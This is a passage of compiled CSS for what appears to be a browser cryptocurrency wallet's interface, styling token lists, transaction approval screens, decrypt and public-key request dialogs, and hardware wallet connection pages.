      [dir='rtl'] .sender-to-recipient--default .sender-to-recipient__name span {
      display: block;
      /*rtl:ignore*/
      direction: rtl; }
      .sender-to-recipient--cards .sender-to-recipient__party {
      display: flex;
      flex-direction: row;
      align-items: center;
      justify-content: center;
      flex: 1;
      border-radius: 4px;
      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.08);
      padding: 6px;
      background: #fff;
      cursor: pointer;
      min-width: 0;
      color: #9b9b9b; }
      .sender-to-recipient--cards .sender-to-recipient__tooltip-wrapper {
      overflow: hidden;
      text-overflow: ellipsis;
      white-space: nowrap; }
      .sender-to-recipient--cards .sender-to-recipient__name {
      overflow: hidden;
      text-overflow: ellipsis;
      white-space: nowrap;
      font-size: 0.5rem; }
      [dir='rtl'] .sender-to-recipient--cards .sender-to-recipient__name {
      /*rtl:ignore*/
      direction: ltr;
      /*rtl:ignore*/
      text-align: right; }
      [dir='rtl'] .sender-to-recipient--cards .sender-to-recipient__name span {
      display: block;
      /*rtl:ignore*/
      direction: rtl; }
      .sender-to-recipient--cards .sender-to-recipient__arrow-container {
      display: flex;
      justify-content: center;
      align-items: center; }
      [dir='rtl'] .sender-to-recipient--cards .sender-to-recipient__arrow-container {
      -webkit-transform: rotate(180deg);
      transform: rotate(180deg); }
      .sender-to-recipient--flat .sender-to-recipient__party {
      display: flex;
      flex-direction: row;
      align-items: center;
      justify-content: center;
      flex: 1;
      padding: 6px;
      cursor: pointer;
      min-width: 0;
      color: #9b9b9b; }
      .sender-to-recipient--flat .sender-to-recipient__tooltip-wrapper {
      overflow: hidden;
      text-overflow: ellipsis;
      white-space: nowrap; }
      .sender-to-recipient--flat .sender-to-recipient__name {
      overflow: hidden;
      text-overflow: ellipsis;
      white-space: nowrap;
      font-size: 0.6875rem; }
      [dir='rtl'] .sender-to-recipient--flat .sender-to-recipient__name {
      /*rtl:ignore*/
      direction: ltr;
      /*rtl:ignore*/
      text-align: right; }
      [dir='rtl'] .sender-to-recipient--flat .sender-to-recipient__name span {
      display: block;
      /*rtl:ignore*/
      direction: rtl; }
      .sender-to-recipient--flat .sender-to-recipient__arrow-container {
      display: flex;
      justify-content: center;
      align-items: center; }
      [dir='rtl'] .sender-to-recipient--flat .sender-to-recipient__arrow-container {
      -webkit-transform: rotate(180deg);
      transform: rotate(180deg); }
      .snackbar {
      padding: 0.75rem 1rem;
      font-size: 0.75rem;
      color: #0260a4;
      min-width: 360px;
      width: -webkit-fit-content;
      width: -moz-fit-content;
      width: fit-content;
      background: #eaf6ff;
      border: 1px solid #75c4fd;
      border-radius: 6px; }
      .tab {
      cursor: pointer;
      padding: 8px;
      min-width: 50px;
      text-align: center; }
      .tab--active {
      color: #000;
      border-bottom: 2px solid #037dd6; }
      .tabs {
      -moz-transform: translateZ(0); }
      .tabs__list {
      display: flex;
      justify-content: flex-start;
      border-bottom: 1px solid #d2d8dd;
      background-color: #fff;
      position: -webkit-sticky;
      position: sticky;
      top: 0;
      z-index: 1; }
      .toggle-button {
      display: flex; }
      .toggle-button__status {
      font-style: normal;
      font-weight: normal;
      font-size: 16px;
      line-height: 23px;
      display: flex;
      align-items: center;
      text-transform: uppercase;
      display: grid; }
      .toggle-button__label-off, .toggle-button__label-on {
      grid-area: 1 / 1 / 1 / 1; }
      .toggle-button__label-off {
      visibility: hidden; }
      .toggle-button__label-on {
      visibility: visible; }
      .toggle-button--off .toggle-button__label-off {
      visibility: visible; }
      .toggle-button--off .toggle-button__label-on {
      visibility: hidden; }
      .token-balance-component {
      display: flex;
      align-items: center; }
      .token-balance-component__text {
      white-space: nowrap;
      overflow: hidden;
      text-overflow: ellipsis; }
      .token-balance-component__suffix {
      padding-left: 4px; }
      .tippy-tooltip.white-theme {
      background: white;
      color: black;
      box-shadow: 0 0 14px rgba(0, 0, 0, 0.18);
      padding: 12px 16px;
      padding-bottom: 11px; }
      .tippy-tooltip.white-theme .tippy-tooltip-content {
      font-style: normal;
      font-weight: normal;
      font-size: 0.75rem;
      font-family: Euclid, Roboto, Helvetica, Arial, sans-serif;
      line-height: 140%;
      text-align: left;
      color: #6a737d; }
      .tippy-popper[x-placement^=top] .white-theme [x-arrow] {
      border-top-color: #fff; }
      .tippy-popper[x-placement^=right] .white-theme [x-arrow] {
      border-right-color: #fff; }
      .tippy-popper[x-placement^=left] .white-theme [x-arrow] {
      border-left-color: #fff; }
      .tippy-popper[x-placement^=bottom] .white-theme [x-arrow] {
      border-bottom-color: #fff; }
      .unit-input {
      display: flex;
      flex-flow: row nowrap;
      align-items: center;
      min-height: 54px;
      border: 1px solid #dedede;
      border-radius: 4px;
      background-color: #fff;
      color: #4d4d4d;
      font-size: 16px;
      padding: 8px 10px;
      position: relative; }
      .unit-input input[type="number"] {
      -moz-appearance: textfield; }
      .unit-input input[type="number"]::-webkit-inner-spin-button {
      -webkit-appearance: none;
      -moz-appearance: none;
      display: none; }
      .unit-input input[type="number"]:hover::-webkit-inner-spin-button {
      -webkit-appearance: none;
      -moz-appearance: none;
      display: none; }
      .unit-input__inputs {
      flex: 1 0 auto;
      display: flex;
      flex-flow: column nowrap; }
      .unit-input__input {
      color: #4d4d4d;
      font-size: 1rem;
      border: none;
      max-width: 22ch;
      height: 16px;
      line-height: 18px; }
      .unit-input__input__disabled {
      background-color: #dedede; }
      .unit-input__input-container {
      display: flex;
      align-items: flex-start;
      padding-bottom: 4px; }
      .unit-input__suffix {
      margin-left: 3px;
      font-size: 1rem;
      line-height: 1rem; }
      .unit-input--error {
      border-color: #f00; }
      .unit-input__disabled {
      background-color: #f2f3f4; }
      .url-icon {
      width: 24px;
      height: 24px;
      background-position: center;
      border-radius: 50%;
      background-color: #fff;
      box-shadow: 0 2px 4px 0 rgba(0, 0, 0, 0.24);
      flex: 0 0 auto;
      -moz-animation: fadein 1s;
      /* Firefox */
      -webkit-animation: fadein 1s;
      /* Safari and Chrome */
      -o-animation: fadein 1s; }
      .url-icon__fallback {
      width: 24px;
      height: 24px;
      border-radius: 50%;
      background: #bbc0c5;
      flex: 0 1 auto;
      justify-content: center;
      align-items: center;
      text-align: center;
      padding-top: 2px; }
      @-webkit-keyframes fadein {
      from {
      opacity: 0; }
      to {
      opacity: 1; } }
      @keyframes fadein {
      from {
      opacity: 0; }
      to {
      opacity: 1; } }
      /** Please import your files in alphabetical order **/
      .token-list-placeholder {
      display: flex;
      align-items: center;
      padding-top: 36px;
      flex-direction: column;
      line-height: 22px;
      opacity: 0.5; }
      .token-list-placeholder__text {
      color: #aeaeae;
      width: 50%;
      text-align: center;
      margin-top: 8px; }
      @media screen and (max-width: 575px) {
      .token-list-placeholder__text {
      width: 60%; } }
      .token-list-placeholder__link {
      margin-top: 0.5rem; }
      .token-list__title {
      font-size: 0.75rem; }
      .token-list__tokens-container {
      display: flex;
      flex-direction: column; }
      .token-list__token {
      transition: 200ms ease-in-out;
      display: flex;
      flex-flow: row nowrap;
      align-items: center;
      padding: 8px;
      margin-top: 8px;
      box-sizing: border-box;
      border-radius: 10px;
      cursor: pointer;
      border: 2px solid transparent;
      position: relative; }
      .token-list__token:hover {
      border: 2px solid rgba(122, 201, 253, 0.5); }
      .token-list__token--selected {
      border: 2px solid #7ac9fd !important; }
      .token-list__token--disabled {
      opacity: 0.4;
      pointer-events: none; }
      .token-list__token-icon {
      width: 48px;
      height: 48px;
      background-repeat: no-repeat;
      background-size: contain;
      background-position: center;
      border-radius: 50%;
      background-color: #fff;
      box-shadow: 0 2px 4px 0 rgba(0, 0, 0, 0.24);
      margin-right: 12px;
      flex: 0 0 auto; }
      .token-list__token-data {
      display: flex;
      flex-direction: row;
      align-items: center;
      min-width: 0; }
      .token-list__token-name {
      /*rtl:ignore*/
      direction: ltr;
      overflow: hidden;
      text-overflow: ellipsis;
      white-space: nowrap; }
      .add-token__custom-token-form {
      padding: 8px 16px 16px; }
      .add-token__custom-token-form input[type="number"]::-webkit-inner-spin-button {
      -webkit-appearance: none;
      display: none; }
      .add-token__custom-token-form input[type="number"]:hover::-webkit-inner-spin-button {
      -webkit-appearance: none;
      display: none; }
      .add-token__search-token {
      padding: 16px; }
      .add-token__token-list {
      margin-top: 16px; }
      .add-token__custom-symbol__label-wrapper {
      display: flex;
      flex-flow: row nowrap; }
      .add-token__custom-symbol__label {
      flex: 0 0 auto; }
      .add-token__custom-symbol__edit {
      flex: 1 1 auto;
      text-align: right;
      color: #037dd6;
      padding-right: 4px;
      cursor: pointer; }
      .asset__container {
      background-color: white; }
      .asset__overview {
      box-shadow: 0 3px 4px rgba(135, 134, 134, 0.16); }
      .asset-navigation {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 16px;
      height: 54px; }
      .asset-breadcrumb {
      font-size: 14px;
      color: #24292e;
      background-color: inherit; }
      .asset-breadcrumb__chevron {
      padding: 0 10px 0 2px;
      font-size: 16px; }
      .asset-breadcrumb__asset {
      font-weight: bold; }
      .token-options__button {
      font-size: 20px;
      color: #24292e;
      background-color: inherit;
      padding: 2px 8px; }
      .token-options__icon {
      font-size: 16px; }
      .confirm-add-token {
      padding: 16px; }
      .confirm-add-token__header {
      font-size: 0.75rem;
      display: flex; }
      .confirm-add-token__token {
      flex: 1;
      min-width: 0; }
      .confirm-add-token__balance {
      flex: 0 0 30%;
      min-width: 0; }
      .confirm-add-token__token-list {
      display: flex;
      flex-flow: column nowrap; }
      .confirm-add-token__token-list .token-balance {
      display: flex;
      flex-flow: row nowrap;
      align-items: flex-start; }
      .confirm-add-token__token-list .token-balance__amount {
      color: #5d5d5d;
      font-size: 43px;
      line-height: 43px;
      margin-right: 8px; }
      .confirm-add-token__token-list .token-balance__symbol {
      color: #5d5d5d;
      font-size: 16px;
      font-weight: 400;
      line-height: 24px; }
      .confirm-add-token__token-list-item {
      display: flex;
      flex-flow: row nowrap;
      align-items: center;
      margin-top: 8px;
      box-sizing: border-box; }
      .confirm-add-token__data {
      display: flex;
      align-items: center;
      padding: 8px; }
      .confirm-add-token__name {
      min-width: 0;
      white-space: nowrap;
      overflow: hidden;
      text-overflow: ellipsis; }
      .confirm-add-token__token-icon {
      margin-right: 12px;
      flex: 0 0 auto; }
      .confirm-approve-content {
      display: flex;
      flex-flow: column;
      align-items: center;
      width: 100%;
      height: 100%;
      font-style: normal; }
      .confirm-approve-content__identicon-wrapper {
      display: flex;
      width: 100%;
      justify-content: center;
      margin-top: 22px;
      padding-left: 24px;
      padding-right: 24px; }
      .confirm-approve-content__full-tx-content {
      display: flex;
      flex-flow: column;
      align-items: center;
      max-width: 100%;
      font-style: normal; }
      .confirm-approve-content__card-wrapper {
      width: 100%; }
      .confirm-approve-content__title {
      font-weight: normal;
      font-size: 24px;
      line-height: 34px;
      width: 100%;
      display: flex;
      justify-content: center;
      text-align: center;
      margin-top: 22px;
      padding-left: 24px;
      padding-right: 24px; }
      .confirm-approve-content__description {
      font-weight: normal;
      font-size: 14px;
      line-height: 20px;
      margin-top: 16px;
      margin-bottom: 16px;
      color: #6a737d;
      text-align: center;
      padding-left: 24px;
      padding-right: 24px; }
      .confirm-approve-content__card, .confirm-approve-content__card--no-border {
      display: flex;
      flex-flow: column;
      border-bottom: 1px solid #d2d8dd;
      position: relative;
      padding-left: 24px;
      padding-right: 24px; }
      .confirm-approve-content__card__bold-text, .confirm-approve-content__card--no-border__bold-text {
      font-weight: bold;
      font-size: 14px;
      line-height: 20px; }
      .confirm-approve-content__card__thin-text, .confirm-approve-content__card--no-border__thin-text {
      font-weight: normal;
      font-size: 12px;
      line-height: 17px;
      color: #6a737d; }
      .confirm-approve-content__card--no-border {
      border-bottom: none; }
      .confirm-approve-content__card-header {
      display: flex;
      flex-flow: row;
      margin-top: 20px;
      align-items: center;
      position: relative; }
      .confirm-approve-content__card-header__symbol {
      width: auto; }
      .confirm-approve-content__card-header__symbol--aligned {
      width: 100%; }
      .confirm-approve-content__card-header__title, .confirm-approve-content__card-header__title-value {
      font-weight: bold;
      font-size: 14px;
      line-height: 20px; }
      .confirm-approve-content__card-header__title {
      width: 100%;
      margin-left: 16px; }
      .confirm-approve-content__card-header__title--aligned {
      margin-left: 27px;
      position: absolute;
      width: auto; }
      .confirm-approve-content__card-content {
      margin-top: 6px;
      margin-bottom: 12px; }
      .confirm-approve-content__card-content--aligned {
      margin-left: 42px; }
      .confirm-approve-content__transaction-total-symbol {
      width: 16px;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 16px; }
      .confirm-approve-content__transaction-total-symbol__x {
      display: flex;
      justify-content: center;
      align-items: center; }
      .confirm-approve-content__transaction-total-symbol__x div {
      width: 22px;
      height: 2px;
      background: #037dd6;
      position: absolute; }
      .confirm-approve-content__transaction-total-symbol__x div:first-of-type {
      -webkit-transform: rotate(45deg);
      transform: rotate(45deg); }
      .confirm-approve-content__transaction-total-symbol__x div:last-of-type {
      -webkit-transform: rotate(-45deg);
      transform: rotate(-45deg); }
      .confirm-approve-content__transaction-total-symbol__circle {
      width: 14px;
      height: 14px;
      border: 2px solid #037dd6;
      border-radius: 50%;
      background: white;
      position: absolute; }
      .confirm-approve-content__transaction-details-content {
      display: flex;
      flex-flow: row;
      justify-content: space-between; }
      .confirm-approve-content__transaction-details-content .confirm-approve-content__small-text {
      width: 160px; }
      .confirm-approve-content__transaction-details-content__fee {
      display: flex;
      flex-flow: column;
      align-items: flex-end;
      text-align: right; }
      .confirm-approve-content__transaction-details-content__primary-fee {
      font-weight: bold;
      font-size: 18px;
      line-height: 25px;
      color: #000; }
      .confirm-approve-content__transaction-details-content__secondary-fee {
      font-weight: normal;
      font-size: 14px;
      line-height: 20px;
      color: #8c8e94; }
      .confirm-approve-content__view-full-tx-button-wrapper {
      display: flex;
      flex-flow: row;
      margin-bottom: 16px;
      justify-content: center; }
      .confirm-approve-content__view-full-tx-button-wrapper i {
      margin-left: 6px;
      display: flex;
      color: #3099f2;
      align-items: center; }
      .confirm-approve-content__view-full-tx-button {
      display: flex;
      flex-flow: row; }
      .confirm-approve-content__edit-submission-button-container {
      display: flex;
      flex-flow: row;
      padding-top: 15px;
      padding-bottom: 30px;
      border-bottom: 1px solid #d2d8dd;
      width: 100%;
      justify-content: center;
      padding-left: 24px;
      padding-right: 24px; }
      .confirm-approve-content__large-text {
      font-size: 18px;
      line-height: 25px;
      color: #24292e; }
      .confirm-approve-content__medium-link-text {
      font-size: 14px;
      line-height: 20px;
      font-weight: 500;
      color: #037dd6; }
      .confirm-approve-content__medium-text, .confirm-approve-content__label {
      font-weight: normal;
      font-size: 14px;
      line-height: 20px;
      color: #24292e; }
      .confirm-approve-content__label {
      font-weight: bold;
      margin-right: 4px; }
      .confirm-approve-content__small-text, .confirm-approve-content__small-blue-text, .confirm-approve-content__info-row {
      font-weight: normal;
      font-size: 12px;
      line-height: 17px;
      color: #6a737d; }
      .confirm-approve-content__small-blue-text {
      color: #037dd6; }
      .confirm-approve-content__info-row {
      display: flex;
      justify-content: space-between;
      margin-bottom: 6px; }
      .confirm-approve-content__data, .confirm-approve-content__permission {
      width: 100%; }
      .confirm-approve-content__permission .flex-row {
      margin-top: 14px; }
      .confirm-approve-content__data__data-block {
      overflow-wrap: break-word;
      margin-right: 16px;
      margin-top: 12px; }
      .confirm-approve-content__footer {
      display: flex;
      align-items: flex-end;
      margin-top: 16px;
      padding-left: 34px;
      padding-right: 24px; }
      .confirm-approve-content__footer .confirm-approve-content__small-text {
      margin-left: 16px; }
      .confirm-approve-content--full {
      height: auto; }
      .request-decrypt-message__container {
      width: 380px;
      border-radius: 8px;
      background-color: #fff;
      box-shadow: 0 2px 4px 0 rgba(0, 0, 0, 0.08);
      display: flex;
      flex-flow: column nowrap;
      z-index: 25;
      align-items: center;
      position: relative;
      height: 100%; }
      @media screen and (max-width: 575px) {
      .request-decrypt-message__container {
      width: 100%;
      top: 0;
      box-shadow: none; } }
      @media screen and (min-width: 576px) {
      .request-decrypt-message__container {
      height: 620px; } }
      .request-decrypt-message__typed-container {
      padding: 17px; }
      .request-decrypt-message__typed-container h1 {
      font-weight: 900;
      margin-bottom: 5px; }
      .request-decrypt-message__typed-container * {
      white-space: nowrap;
      overflow: hidden;
      text-overflow: ellipsis; }
      .request-decrypt-message__typed-container > div {
      margin-bottom: 10px; }
      .request-decrypt-message__header {
      height: 64px;
      width: 100%;
      position: relative;
      display: flex;
      flex-flow: column;
      justify-content: center;
      align-items: center;
      flex: 0 0 auto; }
      .request-decrypt-message__header-background {
      position: absolute;
      background-color: #e9edf0;
      z-index: 2;
      width: 100%;
      height: 100%; }
      .request-decrypt-message__header__text {
      color: #5b5d67;
      font-size: 22px;
      line-height: 29px;
      z-index: 3;
      text-align: center; }
      .request-decrypt-message__header__tip-container {
      width: 100%;
      display: flex;
      justify-content: center; }
      .request-decrypt-message__header__tip {
      height: 25px;
      width: 25px;
      background: #e9edf0;
      -webkit-transform: rotate(45deg);
      transform: rotate(45deg);
      position: absolute;
      bottom: -8px;
      z-index: 1; }
      .request-decrypt-message__account-info {
      display: flex;
      justify-content: space-between;
      margin-top: 18px;
      margin-bottom: 20px; }
      .request-decrypt-message__account {
      color: #9b9b9b;
      margin-left: 17px; }
      .request-decrypt-message__account-text {
      font-size: 14px; }
      .request-decrypt-message__account-item {
      height: 22px;
      background-color: #fff;
      line-height: 16px;
      font-size: 12px;
      width: 124px; }
      .request-decrypt-message__account-item .account-list-item {
      margin-top: 6px; }
      .request-decrypt-message__account-item .account-list-item__account-name {
      text-overflow: ellipsis;
      overflow: hidden;
      white-space: nowrap;
      width: 80px; }
      .request-decrypt-message__account-item .account-list-item__top-row {
      margin: 0; }
      .request-decrypt-message__balance {
      color: #9b9b9b;
      margin-right: 17px;
      width: 124px; }
      .request-decrypt-message__balance-text {
      text-align: right;
      font-size: 14px; }
      .request-decrypt-message__balance-value {
      text-align: right;
      margin-top: 2.5px; }
      .request-decrypt-message__request-icon {
      margin-top: 25px; }
      .request-decrypt-message__body {
      width: 100%;
      height: 100%;
      display: flex;
      flex-flow: column;
      flex: 1 1 auto;
      height: 0; }
      .request-decrypt-message__notice {
      font-size: 14px;
      line-height: 19px;
      text-align: center;
      margin-top: 15px;
      margin-bottom: 11px;
      width: 100%; }
      .request-decrypt-message__message {
      overflow-wrap: break-word;
      margin: 20px;
      overflow: hidden;
      border: 1px solid #dedede;
      padding: 5px;
      border-radius: 5px;
      position: relative; }
      .request-decrypt-message__message-text {
      font-size: 0.7em;
      height: 115px; }
      .request-decrypt-message__message-cover {
      background-color: white;
      opacity: 0.75;
      position: absolute;
      height: 100%;
      width: 100%;
      top: 0; }
      .request-decrypt-message__message-lock {
      position: absolute;
      height: 100%;
      width: 100%;
      top: 0;
      cursor: pointer; }
      .request-decrypt-message__message-lock img {
      padding: 5px;
      background-color: #fff;
      left: calc(50% - 24px);
      position: absolute;
      top: calc(50% - 34px);
      border-radius: 3px; }
      .request-decrypt-message__message-lock--pressed {
      display: none; }
      .request-decrypt-message__message-lock-text {
      width: 200px;
      font-size: 0.75em;
      position: absolute;
      top: calc(50% + 5px);
      text-align: center;
      left: calc(50% - 100px);
      background-color: white;
      line-height: 1em;
      border-radius: 3px; }
      .request-decrypt-message__message-copy {
      justify-content: space-evenly;
      font-size: 0.75em;
      margin-left: 20px;
      margin-right: 20px;
      display: flex;
      cursor: pointer; }
      .request-decrypt-message__message-copy-text {
      margin-right: 10px;
      display: inline; }
      .request-decrypt-message__message-copy-tooltip {
      float: right; }
      .request-decrypt-message__footer {
      width: 100%;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 22px;
      position: relative;
      flex: 0 0 auto;
      border-top: 1px solid #d2d8dd;
      padding: 1.6rem; }
      .request-decrypt-message__footer button {
      width: 165px; }
      .request-decrypt-message__footer__cancel-button {
      margin-right: 1.2rem; }
      .request-decrypt-message__visual {
      display: flex;
      flex-direction: row;
      justify-content: space-evenly;
      position: relative;
      margin: 0 20px; }
      .request-decrypt-message__visual section {
      display: flex;
      flex-direction: column;
      align-items: center;
      flex: 1; }
      .request-decrypt-message__visual-identicon {
      width: 48px;
      height: 48px; }
      .request-decrypt-message__visual-identicon--default {
      background-color: #777a87;
      color: white;
      width: 48px;
      height: 48px;
      border-radius: 24px;
      display: flex;
      align-items: center;
      justify-content: center;
      font-weight: bold; }
      .request-encryption-public-key__container {
      width: 380px;
      border-radius: 8px;
      background-color: #fff;
      box-shadow: 0 2px 4px 0 rgba(0, 0, 0, 0.08);
      display: flex;
      flex-flow: column nowrap;
      z-index: 25;
      align-items: center;
      position: relative;
      height: 100%; }
      @media screen and (max-width: 575px) {
      .request-encryption-public-key__container {
      width: 100%;
      top: 0;
      box-shadow: none; } }
      @media screen and (min-width: 576px) {
      .request-encryption-public-key__container {
      height: 620px; } }
      .request-encryption-public-key__typed-container {
      padding: 17px; }
      .request-encryption-public-key__typed-container h1 {
      font-weight: 900;
      margin-bottom: 5px; }
      .request-encryption-public-key__typed-container * {
      white-space: nowrap;
      overflow: hidden;
      text-overflow: ellipsis; }
      .request-encryption-public-key__typed-container > div {
      margin-bottom: 10px; }
      .request-encryption-public-key__header {
      height: 64px;
      width: 100%;
      position: relative;
      display: flex;
      flex-flow: column;
      justify-content: center;
      align-items: center;
      flex: 0 0 auto; }
      .request-encryption-public-key__header-background {
      position: absolute;
      background-color: #e9edf0;
      z-index: 2;
      width: 100%;
      height: 100%; }
      .request-encryption-public-key__header__text {
      color: #5b5d67;
      font-size: 22px;
      line-height: 29px;
      z-index: 3;
      text-align: center; }
      .request-encryption-public-key__header__tip-container {
      width: 100%;
      display: flex;
      justify-content: center; }
      .request-encryption-public-key__header__tip {
      height: 25px;
      width: 25px;
      background: #e9edf0;
      -webkit-transform: rotate(45deg);
      transform: rotate(45deg);
      position: absolute;
      bottom: -8px;
      z-index: 1; }
      .request-encryption-public-key__account-info {
      display: flex;
      justify-content: space-between;
      margin-top: 18px;
      margin-bottom: 20px; }
      .request-encryption-public-key__account {
      color: #9b9b9b;
      margin-left: 17px; }
      .request-encryption-public-key__account-text {
      font-size: 14px; }
      .request-encryption-public-key__account-item {
      height: 22px;
      background-color: #fff;
      line-height: 16px;
      font-size: 12px;
      width: 124px; }
      .request-encryption-public-key__account-item .account-list-item {
      margin-top: 6px; }
      .request-encryption-public-key__account-item .account-list-item__account-name {
      text-overflow: ellipsis;
      overflow: hidden;
      white-space: nowrap;
      width: 80px; }
      .request-encryption-public-key__account-item .account-list-item__top-row {
      margin: 0; }
      .request-encryption-public-key__balance {
      color: #9b9b9b;
      margin-right: 17px;
      width: 124px; }
      .request-encryption-public-key__balance-text {
      text-align: right;
      font-size: 14px; }
      .request-encryption-public-key__balance-value {
      text-align: right;
      margin-top: 2.5px; }
      .request-encryption-public-key__request-icon {
      margin-top: 25px; }
      .request-encryption-public-key__body {
      width: 100%;
      height: 100%;
      display: flex;
      flex-flow: column;
      flex: 1 1 auto;
      height: 0; }
      .request-encryption-public-key__notice {
      font-size: 14px;
      line-height: 19px;
      text-align: center;
      margin-top: 41px;
      margin-bottom: 11px;
      width: 100%;
      padding-left: 20px;
      padding-right: 20px;
      color: #9b9b9b; }
      .request-encryption-public-key__footer {
      width: 100%;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 22px;
      position: relative;
      flex: 0 0 auto;
      border-top: 1px solid #d2d8dd;
      padding: 1.6rem; }
      .request-encryption-public-key__footer button {
      width: 165px; }
      .request-encryption-public-key__footer__cancel-button {
      margin-right: 1.2rem; }
      .request-encryption-public-key__visual {
      display: flex;
      flex-direction: row;
      justify-content: space-evenly;
      position: relative;
      margin: 0 20px; }
      .request-encryption-public-key__visual section {
      display: flex;
      flex-direction: column;
      align-items: center;
      flex: 1; }
      .request-encryption-public-key__visual-identicon {
      width: 48px;
      height: 48px; }
      .request-encryption-public-key__visual-identicon--default {
      background-color: #777a87;
      color: white;
      width: 48px;
      height: 48px;
      border-radius: 24px;
      display: flex;
      align-items: center;
      justify-content: center;
      font-weight: bold; }
      .connected-sites h2 {
      text-overflow: ellipsis;
      margin-right: 10px; }
      .connected-sites__confirmation {
      flex-direction: column; }
      .connected-sites__confirmation button:first-child {
      margin-right: 24px; }
      .connected-sites__footer-row {
      display: flex;
      width: 100%;
      flex-direction: row;
      justify-content: space-between;
      align-items: center; }
      .connected-sites__footer-row + .connected-sites__footer-row {
      margin-top: 15px; }
      .connected-sites a,
      .connected-sites a:hover {
      font-size: 14px;
      line-height: 20px;
      color: #037dd6;
      cursor: pointer; }
      .connected-accounts__footer a,
      .connected-accounts__footer a:hover {
      color: #037dd6;
      cursor: pointer;
      font-size: 14px; }
      .connected-sites h2 {
      text-overflow: ellipsis;
      margin-right: 10px; }
      .connected-sites__confirmation {
      flex-direction: column; }
      .connected-sites__confirmation button:first-child {
      margin-right: 24px; }
      .connected-sites__footer-row {
      display: flex;
      width: 100%;
      flex-direction: row;
      justify-content: space-between;
      align-items: center; }
      .connected-sites__footer-row + .connected-sites__footer-row {
      margin-top: 15px; }
      .connected-sites a,
      .connected-sites a:hover {
      font-size: 14px;
      line-height: 20px;
      color: #037dd6;
      cursor: pointer; }
      .hw-tutorial {
      width: 375px;
      border-top: 1px solid #d2d8dd;
      border-bottom: 1px solid #d2d8dd;
      overflow: visible;
      display: block;
      padding: 15px 30px; }
      .hw-connect {
      width: 100%; }
      .hw-connect__header__title {
      margin-top: 5px;
      margin-bottom: 15px;
      font-size: 22px; }
      .hw-connect__header__msg {
      font-size: 14px;
      color: #9b9b9b;
      margin-top: 10px;
      margin-bottom: 20px; }
      .hw-connect__btn-wrapper {
      flex: 1;
      flex-direction: row;
      display: flex; }
      .hw-connect__connect-btn {
      width: 315px;
      margin: 20px; }
      .hw-connect__connect-btn.disabled {
      cursor: not-allowed;
      opacity: 0.5; }
      .hw-connect__btn {
      background: #fbfbfb;
      border: 2px solid #e5e5e5;
      height: 100px;
      width: 150px;
      flex: 1;
      display: flex;
      align-items: center;
      justify-content: center;
      border-radius: 5px;
      padding: 0; }
      .hw-connect__btn__img {
      width: 95px; }
      .hw-connect__btn.selected {
      border: 2px solid #00a8ee;
      width: 149px; }
      .hw-connect__btn:first-child {
      margin-right: 15px;
      margin-left: 20px; }
      .hw-connect__btn:last-child {
      margin-right: 20px; }
      .hw-connect__hdPath {
      display: flex;
      flex-direction: row;
      margin-top: 15px;
      margin-bottom: 30px;
      font-size: 14px; }
      .hw-connect__hdPath__title {
      display: flex;
      margin-top: 10px;
      margin-right: 15px; }
      .hw-connect__hdPath__select {
      display: flex;
      flex: 1; }
      .hw-connect__learn-more {
      margin-top: 15px;
      font-size: 14px;
      color: #5b5d67;
      line-height: 19px;
      text-align: center;
      cursor: pointer; }
      .hw-connect__learn-more__arrow {
      -webkit-transform: rotate(90deg);
      transform: rotate(90deg);
      display: block;
      text-align: center;
      height: 30px;
      margin: 0 auto 10px; }
      .hw-connect__title {
      padding-top: 10px;
      font-weight: 400;
      font-size: 18px; }
      .hw-connect__unlock-title {
      padding-top: 10px;
      font-weight: 400;
      font-size: 22px;
      margin-bottom: 15px; }
      .hw-connect__msg {
      font-size: 14px;
      color: #9b9b9b;
      margin-top: 10px;
      margin-bottom: 15px; }
      .hw-connect__error {
      color: #f7861c;
      margin: 20px 20px 10px;
      display: block;
      text-align: center; }
      .hw-connect__link {
      color: #2f9ae0; }
      .hw-connect__footer__title {
      padding-top: 15px;
      padding-bottom: 12px;
      font-weight: 400;
      font-size: 18px;
      text-align: center; }
      .hw-connect__footer__msg {
      font-size: 14px;
      color: #9b9b9b;
      margin-top: 12px;
      margin-bottom: 27px;
      width: 100%;
      display: block;
      margin-left: 20px; }
      .hw-connect__footer__link {
      color: #2f9ae0;
      margin-left: 5px; }
      .hw-connect__get-hw {
      width: 100%;
      padding-bottom: 10px;
      padding-top: 10px; }
      .hw-connect__get-hw__msg {
      font-size: 14px;
      color: #9b9b9b; }
      .hw-connect__get-hw__link {
      font-size: 14px;
      text-align: center;
      color: #2f9ae0;
      cursor: pointer; }
      .hw-connect__step-asset {
      margin: 0 auto 20px;
      display: flex; }
      .hw-account-list {
      display: flex;
      flex: 1;
      flex-flow: column;
      width: 100%; }
      .hw-account-list__title_wrapper {
      display: flex;
      flex-direction: row;
      flex: 1; }
      .hw-account-list__title {
      margin-bottom: 23px;
      align-self: flex-start;
      color: #5d5d5d;
      font-size: 16px;
      line-height: 21px;
      font-weight: bold;
      display: flex;
      flex: 1; }
      .hw-account-list__device {
      margin-bottom: 23px;
      align-self: flex-end;
      color: #5d5d5d;
      font-size: 16px;
      line-height: 21px;
      font-weight: normal;
      display: flex; }
      .hw-account-list__item {
      font-size: 15px;
      flex-direction: row;
      display: flex;
      padding-left: 10px;
      padding-right: 10px; }
      .hw-account-list__item:nth-of-type(even) {
      background-color: #fbfbfb; }
      .hw-account-list__item:nth-of-type(odd) {
      background: rgba(0, 0, 0, 0.03); }
      .hw-account-list__item:hover {
      background-color: rgba(0, 0, 0, 0.06); }
      .hw-account-list__item__index {
      display: flex;
      width: 24px; }
      .hw-account-list__item__radio {
      display: flex;
      flex: 1; }
      .hw-account-list__item__radio input {
      padding: 10px;
      margin-top: 13px; }
      .hw-account-list__item__label {
      display: flex;
      flex: 1;
      padding-left: 10px;
      padding-top: 10px;
      padding-bottom: 10px; }
      .hw-account-list__item__balance {
      display: flex;
      flex: 1;
      justify-content: center; }
      .hw-account-list__item__link {
      display: flex;
      margin-top: 13px; }
      .hw-account-list__item__link img {
      width: 15px;
      height: 15px; }
      .hw-list-pagination {
      display: flex;
      align-self: flex-end;
      margin-top: 10px; }
      .hw-list-pagination__button {
      background: #fff;
      height: 19px;
      display: flex;
      color: #33a4e7;
      font-size: 14px;
      line-height: 19px;
      border: none;
      min-width: 46px;
      margin-right: 0;
      margin-left: 16px;
      padding: 0;
      text-transform: uppercase; }
      .new-external-account-form {
